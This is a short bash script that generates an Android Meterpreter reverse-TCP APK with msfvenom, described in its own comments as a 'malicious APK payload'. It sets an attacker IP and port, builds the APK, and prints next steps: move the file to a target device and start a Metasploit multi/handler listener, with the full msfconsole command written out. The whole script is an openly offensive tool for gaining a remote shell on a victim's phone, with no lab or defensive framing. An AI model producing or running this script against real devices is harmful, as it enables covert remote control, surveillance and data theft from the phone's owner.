#!/bin/bash

# Android Meterpreter Payload Generator Script
# Author: [Your Name]
# Description: This script automates the process of creating a malicious APK payload using msfvenom.

# Define variables
LHOST="192.168.1.100"  # Change this to your attacker's IP
LPORT="4444"           # Change this to your desired port
OUTPUT="payload.apk"

# Check if msfvenom is installed
if ! command -v msfvenom &> /dev/null; then
    echo "Error: msfvenom is not installed. Install Metasploit first."
    exit 1
fi

# Generate the payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT

# Check if payload was created successfully
if [ -f "$OUTPUT" ]; then
    echo "Success: Payload generated as $OUTPUT"
else
    echo "Error: Failed to generate payload."
    exit 1
fi

# Display next steps
echo "Next Steps:"
echo "1. Transfer $OUTPUT to the target device."
echo "2. Start a Metasploit listener:"
echo "   msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit'"
